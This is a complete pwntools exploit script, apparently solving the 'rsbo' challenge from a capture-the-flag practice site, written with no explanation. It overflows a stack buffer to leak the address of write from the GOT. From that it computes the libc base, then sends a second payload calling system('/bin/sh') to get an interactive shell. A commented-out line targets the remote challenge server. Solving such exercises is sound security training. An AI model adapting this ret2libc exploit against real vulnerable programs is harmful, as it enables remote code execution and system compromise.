#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
context.binary = "./rsbo"

io = process("./rsbo", env = {"LD_PRELOAD": "./libc-2.23.so.i386"})
elf = ELF("./rsbo")
libc = ELF("./libc-2.23.so.i386")
#  io = remote("hackme.inndy.tw", 7706)

payload = flat(['\0' * 108, elf.plt['write'], elf.sym['_start'], 1, elf.got['write'], 4])

#  gdb.attach(io, "b *0x8048734\nc")
io.send(payload)
libc.address = u32(io.recvuntil("\xf7")[-4: ]) - libc.sym['write']
success("libc.address -> {:#x}".format(libc.address))

payload = flat(['\0' * 108, libc.sym['system'], 0xdeadbeef, next(libc.search("/bin/sh"))])
io.send(payload)

io.interactive()
io.close()
